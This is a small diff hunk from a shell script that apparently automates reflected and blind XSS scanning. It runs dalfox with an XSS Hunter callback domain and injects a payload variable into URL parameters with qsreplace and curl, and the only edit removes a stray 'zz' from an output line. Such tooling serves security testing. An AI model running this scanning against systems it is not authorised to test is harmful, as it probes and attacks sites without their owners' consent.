@@ -48,4 +48,4 @@ dalfox file  $domain/params.txt  -b $xsshunter_domain -o $domain/dalfox-xss.txt
 
 cat $domain/params.txt|  grep 'FUZZ' | qsreplace "$xss_payload" | tee -a $domain/combinedfuzz.json && cat $domain/combinedfuzz.json | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "$xss_payload" && echo -e "$host \033[0;31mVulnerable\n" | tee -a $domain/Vuln-xss.txt \n\ name;done
 
-echo "${green}Vulnerable XSS Links are stored in $domain/dalfox-xss.txt & $domain/Vuln-xss.txt ${NC}"	zz
+echo "${green}Vulnerable XSS Links are stored in $domain/dalfox-xss.txt & $domain/Vuln-xss.txt ${NC}"	
